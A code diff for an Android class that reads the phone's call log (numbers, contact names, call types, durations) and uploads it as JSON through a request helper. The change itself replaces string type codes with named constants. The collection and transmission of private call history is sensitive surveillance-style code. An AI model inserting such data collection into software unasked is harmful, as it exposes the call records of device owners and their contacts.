@@ -10,6 +10,7 @@ import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 import android.provider.CallLog;
 
+import com.inet.android.request.ConstantRequest;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
@@ -21,15 +22,14 @@ import com.inet.android.utils.Logging;
  * 
  */
 public class ListCall extends AsyncTask<Context, Void, Void> {
-	Context mContext;
-	private String iType = "1";;
+	private Context mContext;
 	private String LOG_TAG = ListCall.class.getSimpleName().toString();
 	private String complete;
 	private String version;
 	private String readCallLogs() {
 		
 		String sendStr = null;
-		String type = "0";
+		int type = -1;
 		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 		version = sp.getString("list_call", "0");
 		Logging.doLog(LOG_TAG, "readCall", "readCall");
@@ -81,18 +81,18 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 					if (name == null)
 						name = "No Name";
 					if (callType == CallLog.Calls.OUTGOING_TYPE) {
-						type = "3";
+						type = ConstantRequest.TYPE_OUTGOING_CALL_REQUEST;
 					} else if (callType == CallLog.Calls.INCOMING_TYPE) {
-						type = "2";
+						type = ConstantRequest.TYPE_INCOMING_CALL_REQUEST;
 					} else if (callType == CallLog.Calls.MISSED_TYPE) {
-						type = "4";
+						type = ConstantRequest.TYPE_MISSED_CALL_REQUEST;
 					}
 					try {
 						archiveCallJson.put("time", dateString);
 						archiveCallJson.put("number", number);
 						archiveCallJson.put("type", type);
 						archiveCallJson.put("name", name);
-						if (!type.equals(3))
+						if (type == 3)
 							archiveCallJson.put("duration", duration);
 						if (sendStr == null)
 							sendStr = archiveCallJson.toString();
@@ -135,7 +135,7 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 
 	private void endList() {
 		Logging.doLog(LOG_TAG, "endList", "endList");	
-		TurnSendList.setList(iType, version, "0", mContext);
+		TurnSendList.setList(ConstantRequest.TYPE_LIST_CALL_REQUEST, version, "0", mContext);
 	}
 
 	private void lastRaw(String sendStr) {
@@ -145,7 +145,7 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 	}
 
 	private void sendRequest(String str, String complete) {
-		RequestList.sendDemandRequest(str, iType, complete, version, mContext);
+		RequestList.sendDemandRequest(str, ConstantRequest.TYPE_LIST_CALL_REQUEST, complete, version, mContext);
 	}
 
 	@Override
